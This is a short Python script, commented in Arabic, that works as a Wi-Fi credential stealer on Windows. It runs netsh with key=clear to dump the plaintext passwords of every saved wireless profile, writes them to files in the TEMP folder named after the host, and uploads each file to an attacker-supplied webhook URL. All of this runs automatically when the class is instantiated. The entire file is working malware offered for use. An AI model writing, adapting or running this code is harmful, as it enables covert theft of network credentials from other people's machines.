import os
import subprocess
import requests
import socket

class Wifi:
    def __init__(self, webhook_url):
        self.networks = {}
        self.temp_path = os.getenv("TEMP")  # الحصول على مسار مجلد Temp بشكل تلقائي
        self.device_name = socket.gethostname()  # الحصول على اسم الجهاز تلقائيًا
        self.webhook_url = webhook_url  # إضافة رابط الويبهوك
        self.get_networks()
        self.save_networks()
        self.send_to_webhook()  # إرسال الملفات إلى الويبهوك

    def get_networks(self):
        try:
            output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
            profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
            
            for profile in profiles:
                if profile:
                    self.networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
        except Exception:
            pass

    def save_networks(self):
        wifi_folder = os.path.join(self.temp_path, f"Wifi_{self.device_name}")  # حفظ الملفات في مجلد خاص باسم الجهاز
        os.makedirs(wifi_folder, exist_ok=True)
        if self.networks:
            for network, info in self.networks.items():
                with open(os.path.join(wifi_folder, f"{network}.txt"), "wb") as f:
                    f.write(info.encode("utf-8"))
        else:
            with open(os.path.join(wifi_folder, "No Wifi Networks Found.txt"), "w") as f:
                f.write("No wifi networks found.")

    def send_to_webhook(self):
        # إرسال كل ملف موجود في المجلد Wifi إلى الويبهوك
        wifi_folder = os.path.join(self.temp_path, f"Wifi_{self.device_name}")
        for file_name in os.listdir(wifi_folder):
            file_path = os.path.join(wifi_folder, file_name)
            if os.path.isfile(file_path):
                self.send_file(file_path)

    def send_file(self, file_path):
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(self.webhook_url, files=files)
            if response.status_code != 200:
                print(f"Error sending file {file_path}: {response.text}")

# استخدم هذه القيم عند إنشاء الكائن

webhook_url = 'WEBHOOKS_URL'  # استبدل هذا بعنوان الويبهوك الخاص بك

# إنشاء كائن من الكلاس
wifi = Wifi(webhook_url)
